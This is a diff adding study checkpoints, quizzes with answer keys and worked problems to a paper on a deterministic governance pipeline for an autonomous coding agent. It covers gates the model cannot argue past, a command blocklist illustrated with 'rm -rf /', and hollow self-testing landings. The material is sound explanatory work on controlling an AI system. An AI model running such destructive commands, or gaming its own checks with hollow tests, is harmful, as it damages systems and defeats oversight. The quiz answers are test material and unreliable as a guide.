+<p>A cautious position: until promotion is shown to be repo-aware, a cross-repo landing should be treated as atomic only up to commit. The evidence that would settle it is either code showing the promotion gate groups commits by operation ID across repos, or a test that quarantines one half of a <code>2c.1</code> landing and checks what happens to the other.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (adversarial).</strong> A <code>2c.1</code> Saga renames a request field from <code>user_id</code> to <code>uid</code> in <code>jarvis/backend/protocols/prime.py</code> and in <code>jarvis-prime/api/v1/schemas.py</code>, the two files from §7.1. Both patches validate on their own, both apply, and the <code>CrossRepoVerifier</code> passes. But a module in <code>jarvis-reactor</code> also reads <code>user_id</code>, and it is not in the Saga. Find every layer in Parts II and III that might catch the third consumer, and decide honestly whether any of them does. Then propose, and label as a proposal, the smallest change that would.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Look at what CONTEXT_EXPANSION does with a path outside the repo (§10.1, step 4), and at which tests VERIFY selects (§16.1).</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Go through the candidate layers.</p>
+<ul>
+<li><strong>CONTEXT_EXPANSION (§10.1).</strong> Suggested paths are resolved against the repo root, and paths outside the repo are rejected by the Iron Gate. Even if the model guessed the Reactor consumer, expansion could not add it to context. The model is structurally unable to look across the boundary through this phase.</li>
+<li><strong>Saga application (§7.2).</strong> Compensation only covers repos that appear in the patch dictionary. Reactor is not one of them, so nothing there is applied or reverted.</li>
+<li><strong>CrossRepoVerifier (§7.2).</strong> It "executes cross-repo tests to validate that the union of the patches is consistent". It catches the break only if its test selection includes Reactor tests that touch the field. The paper does not say how that selection is made, and the scenario says it passed.</li>
+<li><strong>VERIFY (§16.1).</strong> It runs a scoped set of tests that exercise the <em>changed</em> files. The Reactor consumer is unchanged, so its tests are not in scope.</li>
+<li><strong>Stale-exploration guard (§15.3).</strong> It compares hashes of the target files only. It is irrelevant here.</li>
+</ul>
+<p>Honest conclusion: as described, no layer is guaranteed to catch it. The design would ship a contract break into the third repo and leave it for a later sensor, such as a test-failure signal, to find.</p>
+<p>Proposal (not in the paper): when a candidate changes a symbol named in a cross-repo contract, the CrossRepoVerifier's scope should be every repo in the Service's <code>_repo_registry</code> (§6), which already lists <code>jarvis</code>, <code>jarvis-prime</code> and <code>jarvis-reactor</code>, not just the repos in the patch. A cheap first step is a deterministic search for the old field name across all registered repos before GATE, failing closed on any hit outside the Saga. This is a structural check, not a model call, so it fits Principle 5 (§3). To check the proposal, plant exactly this scenario and confirm the operation ends in POSTMORTEM rather than COMPLETE.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (systems design).</strong> Under the October constraints (one 32 GB GPU, no paid lanes), the Service state machine of §6.1 has no honest way to say "the only lane is lent to training". Givens from §93.6 and §93.11: J-Prime cold-loads in 15 s to 18.9 GiB resident; the lease releases 21,236 MiB; Reactor holds the 30B at 15.64 GiB resident while training. (a) Show with the numbers why serving and training cannot share the card. (b) Explain why neither DEGRADED nor FAILED describes a lent lane. (c) Design the missing behaviour and justify it against Principle 2 and §8.2.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Re-read the definitions of DEGRADED and FAILED in §6.1 word for word. Then look for an existing "queue rather than execute" rule in Part III.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>(a) Serving needs 18.9 GiB and training needs 15.64 GiB, a total of 34.54 GiB. A 32 GB card holds at most 32 GiB even on the most generous reading, and less (about 29.8 GiB) if GB means 10^9 bytes. Either way, the two jobs do not fit together, which is why the lease is exclusive. The lease frees 21,236 MiB (about 20.7 GiB), which is more than the 15.64 GiB that training needs. Returning to service costs at least the 15 s cold load.</p>
+<p>(b) §6.1 defines DEGRADED as "some providers unhealthy but operations still flowing". With one lane lent, no generation can flow, so DEGRADED would mislead the operator. FAILED is "a terminal failure state that prevents further operations". A lease is planned and temporary, so marking it terminal would be wrong, and it would block the return.</p>
+<p>(c) Proposal (not in the paper): add a non-terminal state, for example <code>LEASED</code>, entered from ACTIVE when the training lease is granted and left back to ACTIVE when J-Prime's reload is confirmed. While LEASED:</p>
+<ul>
+<li>Intake keeps accepting signals, but the pool does not dispatch GENERATE. This mirrors §8.2 clause 5, where an exhausted budget queues the next operation instead of running it.</li>
+<li>In-flight operations either finish before the lease is granted or are recorded as aborted, never leaked (Principle 1, §8.1).</li>
+<li>The transition is written to the ledger and shown in the cockpit, which already has a GPU-lease lock screen (§6.1, §93.9).</li>
+</ul>
+<p>Justification: Principle 2 forbids blocking boot chains and hanging on a slow dependency. LEASED does not hang; it states plainly that one resource is away and resumes when it returns. It also matches capability assurance, which refuses to run below the declared envelope rather than degrading silently (§93.12). To check the design, run a training handoff during a soak and confirm three things: no operation reaches GENERATE while LEASED, no operation is lost, and queued operations dispatch within roughly the cold-load time after release.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -404,6 +740,16 @@ The phases are what gives O+V its structure, but the *governance contract* is wh
 5. **Cost is tracked continuously.** Every phase transition carries a cost update. When the daily budget is exhausted, the next operation is queued rather than executed.
 
 These five clauses are not advisory. They are enforced by the orchestrator's code structure. A contributor who adds a new phase must wire it into the contract; otherwise the phase will not be reachable from the FSM.
+
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-iii-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">The first two phases decide how dangerous a change is and which model provider should handle it. Would you use a language model to make these two decisions? Predict what the paper chose and why.</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>Neither phase calls a model. CLASSIFY runs a twelve-rule ladder where the first matching rule assigns the risk tier, and ROUTE is a pure-code router that finishes in under a millisecond using lookup tables. The reasons are determinism (replaying a signal gives the same route), cost (routing runs for every operation) and latency (generation needs the time budget). See §9.1 and §9.2.</p>
+</details>
+</aside>
+<!-- engage:end -->
 
 ## §9. CLASSIFY & ROUTE — Risk and Urgency
 
@@ -716,6 +1062,16 @@ This is **Manifesto §7 (Absolute Observability)** at work: the PR is the audita
 
 Before any Yellow auto-apply, the diff is rendered in the CLI with five seconds of delay. During that window, the operator can type `cancel <op-id>` at the REPL to abort. This is Refinement #17 from Edge Case Hardening — a trust-building mechanism that lets the operator veto decisions they disagree with without requiring a full approval workflow.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-iii-2">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">A validated, approved candidate changes four files. The first two write to disk fine, then the third write fails. What state should the repository be left in, and how could the system make that possible?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>The repository should be left exactly as it was before APPLY. Before each file is written, <code>RollbackArtifact.capture()</code> snapshots it; on failure, the already-applied files are restored in reverse order from those snapshots and the error propagates to POSTMORTEM. Each file also gets its own <code>::NN</code> sub-op id for observability. See §15.1 and §15.2.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §15. APPLY — Writing Changes to Disk
 
 > **Big Picture:** APPLY is the moment of truth. The patches have been validated. Approval has been secured. Now the changes are actually written to the file system. The ChangeEngine performs this with full rollback capability — if anything goes wrong mid-write, the pre-APPLY state is restored.
@@ -829,6 +1185,165 @@ Every terminal transition writes a `LedgerEntry` to `~/.jarvis/ouroboros/ledger/
 
 This ledger is the foundation for Principle 7 (Absolute Observability). It is the data source that feeds cost analysis, failure-mode classification, convergence trend detection, and — ultimately — the capability-graduation mechanism (Manifesto §6).
 
+<!-- engage:begin -->
+#### Check your understanding: PART III — The Eleven-Phase Pipeline
+
+<div class="engage" id="engage-part-iii">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. The Part's opening says GENERATE's content is probabilistic but the decision to proceed is deterministic. Where does that boundary show up in the phases, and why does it make autonomy safe?</summary>
+<p>GENERATE is the only place the model shapes the change, through a multi-turn tool loop (§12). Everything that decides whether that output reaches disk is deterministic: the exploration and ASCII gates after GENERATE (§12.4), syntax, type and test checks in VALIDATE (§13.1), the tier table at GATE (§14.1), and the scoped tests at VERIFY (§16.1). A model can produce a bad patch, but it cannot argue its way through a failing test or a tier rule. Transitions follow explicit conditions enforced by the orchestrator's contract, so the system can be autonomous without trusting the model's judgement about its own work (§8, §8.2).</p>
+</details>
+<details class="cq"><summary>2. Planning failures are "soft" and the stale-exploration guard is also soft, while the Iron Gates at GENERATE are hard. What principle seems to decide which checks may fail open?</summary>
+<p>Soft checks are ones whose failure costs quality or efficiency but not safety. A failed plan just means GENERATE runs without one, and an incoherent plan is downgraded to "default approach" (§11.3, §11.5). The stale guard is soft because concurrent operations are rare and false positives are judged worse than occasional stale writes, with L2 or later sensors repairing the damage (§15.3). The Iron Gates protect against things the system has decided must never happen without exploration, or that could corrupt files (non-ASCII), so violations force regeneration (§12.4). The paper is candid that the stale guard is a trade-off "today", not a guarantee.</p>
+</details>
+<details class="cq"><summary>3. Why does VERIFY re-run tests after APPLY when VALIDATE already ran them on the candidate?</summary>
+<p>VALIDATE checks the candidate in isolation; VERIFY checks it in situ, with the patch actually on disk alongside everything else (§16). The paper's point is that "validation in isolation is not enough". Problems such as the stale-file case in §15.3, where a candidate was built on outdated file state, only show up once the real tree is involved. VERIFY keeps cost down by running only tests that exercise the changed files (§16.1). If those fail and L2 cannot repair it, the RollbackArtifact stack undoes the applied changes, so the safety net covers the write itself (§16.2).</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-iii">
+<div class="mcq" data-answer="4">
+<p class="mcq-q">1. A <code>todo_scanner</code> signal of ordinary complexity arrives marked high urgency. According to §9.2, which route does it get?</p>
+<ol class="mcq-options" type="A">
+<li>IMMEDIATE, because urgency is high</li>
+<li>STANDARD, the fall-through default</li>
+<li>SPECULATIVE, as proactive exploration</li>
+<li>BACKGROUND, regardless of urgency</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> §9.2 lists <code>todo_scanner</code> in <code>_BACKGROUND_SOURCES</code>, whose signals "always route to BACKGROUND regardless of urgency". Only the three sources in <code>_IMMEDIATE_SOURCES</code> get IMMEDIATE on high urgency.</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">2. A model emits a patch after calling only <code>list_dir</code> and one <code>read_file</code>. What happens?</p>
+<ol class="mcq-options" type="A">
+<li>The patch goes to VALIDATE with a warning attached</li>
+<li>GENERATE_RETRY with targeted feedback to explore more</li>
+<li>The operation is BLOCKED and ends at once</li>
+<li>The ASCII gate repairs the patch and lets it pass</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> §12.4 requires at least two calls to exploration tools (<code>read_file</code>, <code>search_code</code>, <code>get_callers</code>) before any patch. One <code>read_file</code> is not enough, and <code>list_dir</code> is not on that list, so the gate triggers a regeneration.</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">3. When does context auto-compaction kick in during a tool loop, and what does it keep?</p>
+<ol class="mcq-options" type="A">
+<li>Above 75% of a 98,304-character budget; it keeps the six newest tool chunks</li>
+<li>Above 50% of the budget; a model summarises all prior tool results</li>
+<li>After five tool rounds; it drops every result except the final one</li>
+<li>Above 90% of the budget; it keeps only the <code>read_file</code> results</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> §12.5 sets the threshold at 75% of a default 98,304-character budget, keeps the six most recent tool chunks, and summarises older ones by deterministic counting with no model inference.</p>
+</details>
+</div>
+<div class="mcq" data-answer="3">
+<p class="mcq-q">4. An operator types <code>cancel &lt;op-id&gt;</code> while a model call is still streaming. When does the operation become CANCELLED?</p>
+<ol class="mcq-options" type="A">
+<li>Immediately; the model call is killed mid-stream</li>
+<li>Only after VERIFY, so the change can be rolled back</li>
+<li>At the next phase boundary, after the in-flight call finishes</li>
+<li>Never; cancellation applies only to Orange-tier operations</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> §17.3 says cancellation is cooperative: the orchestrator checks the flag at phase boundaries, not mid-phase, so an in-flight model call completes before the transition. §15.4 describes the last such check, between GATE and APPLY.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-iii">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> At 03:00 a test fails in a single, non-core, non-security file, and the signal arrives with high urgency from <code>test_failure</code>. Walk the operation through every phase to COMPLETE. For each phase, name the decision taken and one thing that could stop or divert the operation there.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Decide the risk tier and route first, then check which bracketed phases a trivial operation skips. Do not forget the consciousness bridge at CLASSIFY or the budget clause in §8.2.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>CLASSIFY: a single non-core, non-security file is <code>SAFE_AUTO</code> (§9.1). It could be diverted to BLOCKED if the file matched a protected path, or bumped to <code>NOTIFY_APPLY</code> if the consciousness bridge rates regression risk HIGH. ROUTE: <code>test_failure</code> with high urgency goes IMMEDIATE, so Claude is called directly (§9.2). If the daily budget is exhausted, the op is queued instead (§8.2).</p>
+<p>CONTEXT_EXPANSION and PLAN may be skipped for a trivial single-file op (§10, §11.2); a failed plan would be soft anyway (§11.3).</p>
+<p>GENERATE: the tool loop runs for up to five rounds; the exploration-first and ASCII gates can force GENERATE_RETRY (§12.2, §12.4).</p>
+<p>VALIDATE: syntax, type check, a 60-second test run and Iron Gate checks. Failure uses up to two VALIDATE_RETRY attempts, then L2 with five iterations in 120 seconds; if L2 fails, the op goes to POSTMORTEM (§13).</p>
+<p>GATE: <code>SAFE_AUTO</code> auto-approves silently (§14.1). A cancel flag checked before APPLY would end it as CANCELLED (§15.4).</p>
+<p>APPLY: snapshot, then an atomic temp-then-rename write; a write failure restores the snapshot and goes to POSTMORTEM (§15.1). VERIFY: scoped tests; a failure goes to L2, and if L2 fails everything is rolled back (§16.2).</p>
+<p>COMPLETE: the terminal record is written and the AutoCommitter creates the signed commit (§17.1).</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> Someone proposes making the stale-exploration guard a hard reject: if any target file's SHA-256 at APPLY differs from its GENERATE-time hash, the operation fails. Using §15.3 and the governance contract in §8.2, weigh the benefit against the cost and say what you would need to know before adopting it.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The paper states its own reasoning for keeping the guard soft. What assumption does that reasoning rest on?</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Benefit: no candidate built on outdated file state would ever be written, closing the window §15.3 admits exists ("occasional stale writes").</p>
+<p>Cost: today the guard only warns and writes a ledger entry because the paper judges concurrent operations rare and false positives worse than stale writes. A hard reject would send every mismatch to POSTMORTEM, wasting the generation and validation spend already incurred, which the cost clause of §8.2 tracks.</p>
+<p>The decision rests on an empirical question: how often hashes actually differ, and how often those cases are harmless. The ledger records every stale-guard warning, so you could measure the rate before deciding. If stale writes turned out common or damaging, the assumption behind the soft gate would fail and a hard reject would be justified. See §15.3 and §17.6.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/urgency_router.py</code>. Find <code>_IMMEDIATE_SOURCES</code>, <code>_BACKGROUND_SOURCES</code> and <code>_COMPLEX_COMPLEXITIES</code>, then the routing method that uses them. (a) List entries in each set that are not in the paper's §9.2 description. (b) Is it exactly true in code that a background source routes to BACKGROUND "regardless of urgency"?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Search for <code>source in _BACKGROUND_SOURCES</code> and read the condition on the second such check.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>(a) <code>_IMMEDIATE_SOURCES</code> now also includes <code>operator_chat</code>, a goal typed by the operator, justified in a comment as the same class as <code>voice_human</code>. <code>_BACKGROUND_SOURCES</code> adds <code>memory_hygiene</code>, <code>cage_hygiene</code>, <code>capability_severance</code> and <code>audit_regression</code>. <code>_COMPLEX_COMPLEXITIES</code> adds <code>architectural</code>; its comment says leaving it out made architectural single-file ops fall through to STANDARD.</p>
+<p>(b) Not exactly. The code first routes a background source with low urgency (the only member of <code>_BACKGROUND_URGENCIES</code>) to BACKGROUND, and then routes any other background source to BACKGROUND only if its complexity is not in <code>_COMPLEX_COMPLEXITIES</code>. A background source with <code>heavy_code</code>, <code>complex</code> or <code>architectural</code> complexity therefore falls through to the COMPLEX check. Also note IMMEDIATE checks come first in the method, so their ordering matters.</p>
+<p>The lesson matches §9.2's core claim: routing is a fixed, ordered set of pure-code checks you can read and replay, and the paper's table is a summary of that ordering, which has grown since it was written.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. The governance contract (§8.2) guarantees every transition is logged, every exception reaches POSTMORTEM, and every retry is bounded. Yet §93.8 reports 524 byte-identical VALIDATE_RETRY iterations re-validating a frozen pool, and 532 micro-fix runs that made zero repairs. What does the contract guarantee, and what does it not?</summary>
+<p>The five clauses are about <em>termination and visibility</em>. No operation leaks (§8.1). No crash is silent. No loop runs forever. No pre-rejected op wastes work. Cost is always tracked. Every one of those held during the 524 retries: they were bounded, logged and ended in a terminal state.</p>
+<p>What the contract does not promise is <em>efficacy</em>: that a rung, once reached, actually changes anything. A retry that re-validates the same frozen candidate is reachable, bounded and logged, and it still does nothing. That is exactly the "brute-force retries without diagnosis" the Zero-Shortcut Mandate forbids (§3), and the contract cannot see it, because it checks the shape of the run, not its effect.</p>
+<p>§93.12 names the missing dimension. The reachability ledger tracks each capability through registered, invoked and <em>effective</em>, and a full scan found 131 features "DARK". The evidence needed per rung is simple: did the retry produce a different candidate, and did the repair change the verdict? A rung that runs often but never changes the candidate or the verdict is inert, however clean its ledger looks.</p>
+</details>
+<details class="cq-adv"><summary>A2. The exploration-first gate (§12.4) is hard: a patch without at least two exploration calls goes to GENERATE_RETRY. What happens when that hard gate meets a model that cannot reliably satisfy it, and why was the October fix not to soften the gate?</summary>
+<p>A hard gate turns non-compliance into retries, and repeated non-compliance into zero throughput. §93.6 shows this live: before the fix, the local 30B produced 106 in-loop rejections and zero candidates in <code>bt-2026-08-31-155308</code>. The gate did its safety job perfectly and stopped the pipeline completely.</p>
+<p>Softening the gate would have bought throughput by giving up the property the gate exists for: patches written by a model that had read the code first (§12.4, Part VII §47). That would be a bypass, which the Zero-Shortcut Mandate rules out (§3).</p>
+<p>The fix was structural instead. Stateful tool masking (lever 3, <code>tool_masking.py</code>) changes the constrained-decoding grammar so that only tool calls are allowed until the minimum exploration is met. With nothing else changed, the full tool union explored 0/3, {tool, noop} gave 3/3 noop, and {tool} explored 3/3 (§93.6). The gate stayed hard. The model was simply made unable to violate it. The general lesson is that a hard gate on a weak generator should be enforced at the point of generation, not only checked after it.</p>
+</details>
+<details class="cq-adv"><summary>A3. VERIFY runs only tests that exercise the changed files (§16.1). §93.10 reports that 84 of 91 autonomous landings were new test files. What does a VERIFY "pass" actually tell you for such a landing, and is the Test Reality Gate the right fix?</summary>
+<p>When the candidate is itself a new test file, the scoped run is mostly the candidate testing itself. A test that asserts nothing, or never imports the module it claims to test, passes trivially. For this class of landing, VERIFY's pass is close to vacuous: it shows the file runs, not that it checks anything.</p>
+<p>The paper records this failure happening. A hollow landing (<code>c985ccaee4</code>) reached <code>main</code> and was reverted (<code>fcc50352f0</code>). The Test Reality Gate followed: it rejects candidate tests that cannot execute, assert nothing, or never import their subject (§93.8). Separately, the Antivenom audit added a detector for tautological ("quine") tests (§93.12).</p>
+<p>A reasonable position is that the Reality Gate is necessary but not sufficient. It rules out tests that are hollow in form, but a test can import its subject and assert something true without being able to catch a real bug. The evidence that would settle it is a mutation check on the subject module. Proposal (not in the paper): plant a small fault in the subject and require the new test to fail. If a meaningful share of Reality-Gate-passing tests still pass against the mutant, the gate is too weak for a corpus that is 92% tests.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (quantitative).</strong> Use only the April defaults to test whether the budgets fit together. Givens: STANDARD worker watchdog 120 s and COMPLEX 180 s, "plus grace and tool-loop overhead" (§2); test runs time out at <code>JARVIS_VERIFY_TIMEOUT_S</code> = 60 s (§13.1, §16.1); <code>JARVIS_MAX_VALIDATE_RETRIES</code> = 2 (§13.2); L2 timebox 120 s (§13.3); Orange approval wait 600 s (§14.1). Assume every test run uses its full timeout and ignore generation time. (a) Compute a lower bound for the test-and-repair time of a STANDARD op that uses every rung in VALIDATE and VERIFY. (b) Compare the Orange approval wait with the COMPLEX watchdog. (c) Say what §93.12 did about this.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>VALIDATE is one run plus two retries, then L2. VERIFY is one run, then L2, then a re-run of VERIFY (§16.2).</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Assumptions: each test run takes its full 60 s timeout, generation and grace are left out, and L2 uses its full 120 s timebox. Leaving out generation makes this a lower bound.</p>
+<p>(a) VALIDATE: the first run plus two retries is 3 × 60 = 180 s. Escalating to L2 adds 120 s, for 300 s. VERIFY: one run is 60 s. On failure L2 adds 120 s, and the re-run of VERIFY adds 60 s, for 240 s. The total is 300 + 240 = 540 s, which is 4.5 times the 120 s STANDARD watchdog. Even the minimum path, one VALIDATE run and one VERIFY run, is 120 s at full timeout: the whole watchdog, with nothing left for generation.</p>
+<p>(b) An Orange op can wait 600 s for a human. That is 600 / 180 ≈ 3.3 times the COMPLEX watchdog. A watchdog that is not suspended during the approval wait would fire long before the human answered.</p>
+<p>(c) The paper does not say how April resolved these overlaps; the unspecified "grace and tool-loop overhead" may have absorbed some of them. What §93.12 records is the structural fix. About 40 run budgets are now derived from one wall-clock figure instead of being set independently, with tests that pin them against drift. The inline approval wait now has a deadline below the pipeline budget and fails closed.</p>
+<p>Conclusion: independently set timeouts can each be sensible and still contradict each other. Deriving them from one figure makes the contradiction impossible to write down. Check: re-add the sums (180 + 120 + 60 + 120 + 60 = 540) and confirm that every term is a default quoted in Part III or §2.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (cross-Part trace).</strong> §93.10 lists landing <code>f97f8195d6</code> (2026-09-07) on <code>governance/candidate_generator.py</code>. It was meant to make the generator decline multi-file swarm ops, but only a punctuation rewrite landed, and it was reverted (<code>c8430f9b6a</code>). Trace a change like this through the Part III phases and the October path to <code>main</code> (§93.7, §93.8). At each gate, say whether it would catch "valid code that does not do what the goal asked". Then say what kind of check would catch it, labelling anything new as a proposal.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Every gate you will meet checks safety, syntax, tests or structure. Look for one that compares the diff with the goal's intent.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Trace the phases.</p>
+<ul>
+<li><strong>CLASSIFY and ROUTE (§9).</strong> The path is not protected, so the op is not BLOCKED. A governance file may raise the tier, but tiering is about risk, not intent.</li>
+<li><strong>GENERATE (§12.4).</strong> Exploration-first and ASCII checks look at behaviour and bytes. A punctuation edit passes both.</li>
+<li><strong>VALIDATE (§13.1).</strong> Syntax, types and tests all pass, because punctuation changes nothing they measure. The Test Reality Gate (§93.8) only applies to candidate tests.</li>
+<li><strong>GATE and APPROVE (§14).</strong> With the Sentinel, approval is automatic up to a tier ceiling. BLOCKED work, Order-2 self-modification and anything touching the cage escalate (§93.7). This file was none of those, so nothing escalated.</li>
+<li><strong>APPLY and VERIFY (§15, §16).</strong> The write succeeds and the scoped tests still pass.</li>
+<li><strong>Promotion gate (§93.7).</strong> It checks provenance, coverage, and that no public symbol vanished. A punctuation edit keeps every symbol. It passes.</li>
+</ul>
+<p>So every gate described would let this through, because each one asks "is it safe and well-formed?" and none asks "did it do the task?" The paper says this was reverted by hand. It does not say which gates were active on 2026-09-07, so this trace uses the gates as described.</p>
+<p>What exists nearby: the declared-symbol contract carries the goal's target symbol to GENERATE (§93.8), and §93.4 mentions a "candidate value gate" from July without describing its rule. The paper does not show either one judging a diff against intent.</p>
+<p>Proposal (not in the paper): a deterministic post-VALIDATE check that the diff touches the declared target symbol, and that it is not whitespace or punctuation only. Ops failing it would go to VALIDATE_RETRY with that feedback. It is pure code, so it keeps Principle 5's rule that deterministic code decides (§3). To check it, replay <code>f97f8195d6</code>'s candidate and confirm it is rejected while <code>e7b3bdfec2</code>, the +9-line retry that stands, passes.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -1031,6 +1546,16 @@ MCP tools bypass the standard manifest check (policy Rule 0) and are auto-allowe
 - *Output:* Operator's answer, or `{"status": "timeout"}` after 300s.
 - *Iron Gate:* **Risk-tier gated.** DENIED for `SAFE_AUTO` (low-risk ops should not interrupt). ALLOWED for `NOTIFY_APPLY` and `APPROVAL_REQUIRED`. DENIED for `BLOCKED`. Manifesto §5 alignment: asking the human a 10-second question can save 5 minutes of wrong-direction work, but only when the risk warrants the interruption.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-iv-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">All 15 primary tools, including <code>bash</code> and <code>write_file</code>, are enabled by default. If the safety perimeter is not an opt-in switch, what kind of check must stand between a model's tool call and its execution, and should that check reason about the model's explanation?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>A deterministic policy engine evaluates every call against an ordered rule ladder (path containment, protected paths, a command blocklist, a domain allowlist, risk-tier and environment gates, concurrency and rate limits) and returns ALLOWED or DENIED with a reason. It deliberately ignores the model's reasoning: it reads file paths, token types and command strings, so a persuasive argument for <code>rm -rf /</code> is still denied. The paper calls this gate pre-linguistic. See §21.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §21. The Iron Gate at the Tool Boundary
 
 > **Big Picture:** Every tool call is evaluated by a policy engine before execution. The policy is not an AI — it is a rule ladder that reads the call's arguments, checks them against a deterministic set of checks, and returns `ALLOWED` or `DENIED` with a reason. This section describes the policy's structure, because understanding it is the key to understanding why O+V can enable tools by default without compromising safety.
@@ -1126,6 +1651,16 @@ Each server is either `stdio` (local subprocess) or `sse` (remote HTTPS endpoint
 ### §22.6 Manifesto Alignment
 
 MCP forwarding is a direct expression of **Principle 5 (Intelligence-Driven Routing)**: tool choice is dynamic, not hardcoded. When a new MCP server is added to the config, the model sees its tools on the next generation and can call them immediately. No code change. No manifest update. Dynamic capability discovery.
+
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-iv-2">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">The tool loop improves the first draft, but sometimes VALIDATE still rejects it after its retries. What would a repair loop need in order to keep trying without spinning forever or bouncing between two broken versions?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>L2 Self-Repair is a small state machine: generate a patch with failure context, validate it, classify the failure (syntax, test, environment, flaky), judge progress, then decide whether to retry. It stops on pipeline deadline, its own 120-second timebox, five iterations, two iterations in a row with no improvement, or oscillation, detected when a signature hash matches an earlier iteration. See §23.</p>
+</details>
+</aside>
+<!-- engage:end -->
 
 ## §23. L2 Self-Repair Engine — When Validation Fails
 
@@ -1285,6 +1820,159 @@ The Venom tool loop lives **inside** the GENERATE phase. The Iron Gate fires **a
 
 Every phase writes to the ledger. Every tool call is an audit-trail entry. Every terminal state is observable. This is the integrated picture of what "disciplined self-improvement" looks like at the level of a single operation.
 
+<!-- engage:begin -->
+#### Check your understanding: PART IV — Venom: The Agentic Execution Layer
+
+<div class="engage" id="engage-part-iv">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Most agentic frameworks disable tools by default. Why does O+V do the opposite, and what makes that choice safe rather than reckless?</summary>
+<p>The paper argues that default-deny would force the human to pre-authorize every class of action, which defeats procedural autonomy (§21.3). So O+V enables tools by default and moves safety into structure: the Iron Gate's path checks, protected paths, command blocklist, risk engine and approval gates (§18.3). Those checks encode the human's non-negotiable constraints, and everything else is the model's to explore. The choice is safe only because the gate is deterministic and pre-linguistic: it reads arguments, not reasoning, so the model cannot talk its way past it (§21.2). Without the structural deny, default-allow would be unconstrained risk rather than autonomy.</p>
+</details>
+<details class="cq"><summary>2. What was the L2 deadline bug of Sessions V–W, and what general lesson does its fix teach about clocks inherited from earlier phases?</summary>
+<p>L2's timebox was clamped by <code>ctx.pipeline_deadline</code>, which the preceding VALIDATE phase had already drained, so L2 received only the leftover time even when its own budget was set much higher (§23.4). The repair loop was starved by a clock it did not own. The fix computes L2's deadline fresh at dispatch as now plus <code>JARVIS_L2_TIMEBOX_S</code>, and reconciles the pipeline deadline upward so later phases see the larger budget. A mandatory INFO line names both clocks and the winning cap, so the decision is visible. The lesson: a phase with its own budget should not silently inherit an earlier phase's spent clock, and the choice between them should be logged. The paper credits this fix as the proximate cause of the first end-to-end multi-file APPLY.</p>
+</details>
+<details class="cq"><summary>3. Context compaction summarizes old tool results by counting rather than by asking a model. What does this gain, and what does it give up?</summary>
+<p>Counting tool calls by name and summing character counts costs nothing in inference, runs in microseconds, and gives the same summary for the same input every time (§24.3). That keeps the tool loop's memory growth bounded and predictable, which the paper ties to disciplined concurrency (§24.5). The cost is that the specific content of older results is gone; only their statistical profile survives. The paper's justification is that older chunks have already been read and acted on, while the six most recent chunks, which matter most for the next turn, are kept verbatim (§24.4). If the post-compaction prompt still exceeds the hard limit, the next call fails with a budget error, so compaction is a soft gate rather than a guarantee (§24.1).</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-iv">
+<div class="mcq" data-answer="3">
+<p class="mcq-q">1. The tool loop reaches its fifth round and the model is still calling tools. What happens next by default?</p>
